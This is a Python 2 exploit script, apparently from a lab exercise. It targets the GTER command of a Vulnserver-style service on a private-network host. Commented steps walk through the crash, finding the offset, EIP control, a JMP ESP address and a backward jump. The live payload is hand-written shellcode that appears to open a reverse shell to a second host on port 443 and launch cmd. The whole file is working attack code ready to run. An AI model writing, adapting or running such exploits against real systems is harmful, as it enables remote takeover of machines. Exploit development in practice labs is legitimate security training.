#!/usr/bin/python

import socket
import os
import sys
import time

host = "192.168.112.145"
port = 9999

# 1 - Crash
# buffer = "GTER "+"A"*214

# 2 - Offset
# buffer = "GTER "+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0A"

# 3 - Control EIP
# /usr/bin/msf-pattern_offset -l 214 -q 66413066
# [*] Exact match at offset 151
# buffer = "GTER "+151*"A"+"BBBB"+"C"*(214-151-4)

# 4 - JMP to ESP
# 7783B391   FFE4             JMP ESP
jmp_esp = "\x91\xb3\x83\x77"

# buffer = "GTER "+151*"A"+jmp_esp+"C"*(214-151-4)
# 5 - JMP back
# E9 60 FF FF FF
jmp_back="\xe9\x60\xff\xff\xff"
# buffer = "GTER "+151*"A"+jmp_esp+jmp_back+"C"*(214-151-4-len(jmp_back))


# 6 - Skape + Absolomb + h0mbre magic. Seriously magic
buf  = "\x50\x5c\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x2a"
buf += "\xc8\xff\x75\x31\xc0\xff\xd3\x96\x68\xc0\xa8\x70\x8f\x66\x68\x01"
buf += "\xbb\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\xdd"
buf += "\x6b\xff\x75\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1"
buf += "\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1"
buf += "\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04"
buf += "\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51"
buf += "\x52\xbb\x82\x20\x88\x77\xff\xd3"

buffer = "GTER "+buf+"A"*(151-len(buf))+jmp_esp+jmp_back+"C"*(214-151-4-len(jmp_back))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send(buffer)
print s.recv(1024)
s.close()
